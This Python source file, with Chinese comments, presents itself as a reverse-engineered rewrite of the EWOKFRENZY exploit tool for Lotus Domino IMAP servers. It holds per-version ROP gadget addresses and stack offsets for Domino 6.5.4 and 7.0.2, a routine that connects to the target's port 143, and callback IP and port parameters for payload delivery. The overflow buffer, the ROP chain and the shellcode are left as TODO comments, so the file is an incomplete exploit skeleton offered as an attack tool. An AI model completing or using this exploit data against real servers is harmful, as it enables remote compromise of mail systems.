"""ewok_frenzy — EWOKFRENZY Lotus Domino IMAP 利用核心逻辑。

Python 重写的 `Ewokfrenzy-2.0.0.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 Lotus Domino IMAP 利用流程。

参数定义来源：Ewokfrenzy-2.0.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 143
DEFAULT_TIMEOUT = 60

# 每个 Lotus Domino 版本的 ROP gadget 地址（来自 XML <DominoVersion><paramgroup>）
DOMINO_VERSION_GADGETS = {
    "6.5.4": {
        "AddrPopEax": 0x00428463,
        "AddrVirtualAlloc": 0x0042E038,
        "AddrJmpEaxPtr": 0x00420CF5,
        "AddrPopEdi": 0x60132252,
        "AddrEaxToEsi": 0x60951039,
        "AddrCopyCode": 0x607112B4,
        "AddrIncEax": 0x60168187,
        "AddrJmpEax": 0x600A371D,
        "AddrSetAtEdxRet": 0x609DBEA1,
        "AddrClrEaxRet": 0x0042845E,
        "OffsetEsp2Buffer": 0xBC,
        "OffsetEsp2Ebp": 0x90,
        "CleanupOverflowed": 0x60A528EC,
    },
    "7.0.2": {
        "AddrPopEax": 0x0042A001,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041D5A7,
        "AddrPopEdi": 0x0042CB58,
        "AddrEaxToEsi": 0x100AAADD,
        "AddrCopyCode": 0x60709A24,
        "AddrIncEax": 0x600F8E54,
        "AddrJmpEax": 0x00429A6C,
        "AddrSetAtEdxRet": 0x004050A7,
        "AddrClrEaxRet": 0x6001FAC1,
        "OffsetEsp2Buffer": 0xBC,
        "OffsetEsp2Ebp": 0x90,
        "CleanupOverflowed": 0x60B3FDF8,
    },
}

class EwokFrenzyError(Exception):
    pass


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    domino_version="7.0.2",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    verbose=False,
):
    """执行 EWOKFRENZY 利用序列。

    当前阶段：完成参数解析、IMAP 连接。
    具体 exploit 缓冲区（IMAP 缓冲区溢出、ROP 链、shellcode、载荷投递等）
    的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Domino version: {domino_version}")
        print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    # 解析常量
    gadgets = DOMINO_VERSION_GADGETS.get(domino_version, DOMINO_VERSION_GADGETS["7.0.2"])

    if verbose:
        print(f"[*] AddrPopEax: 0x{gadgets['AddrPopEax']:08X}")
        print(f"[*] AddrVirtualAlloc: 0x{gadgets['AddrVirtualAlloc']:08X}")
        print(f"[*] AddrJmpEax: 0x{gadgets['AddrJmpEax']:08X}")
        print(f"[*] OffsetEsp2Buffer: 0x{gadgets['OffsetEsp2Buffer']:03X}")
        print(f"[*] OffsetEsp2Ebp: 0x{gadgets['OffsetEsp2Ebp']:03X}")

    # 建立到目标的 TCP 连接（IMAP 143）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EwokFrenzyError(f"无法连接到 {target}:{port}: {exc}") from exc

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - IMAP 缓冲区溢出（OffsetEsp2Buffer 相关）
    #   - ROP 链（AddrPopEax, AddrJmpEax, AddrVirtualAlloc, AddrJmpEaxPtr,
    #     AddrPopEdi, AddrEaxToEsi, AddrCopyCode, AddrIncEax,
    #     AddrSetAtEdxRet, AddrClrEaxRet）
    #   - Shellcode 注入
    #   - 载荷投递（Callback）

    sock.close()
    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
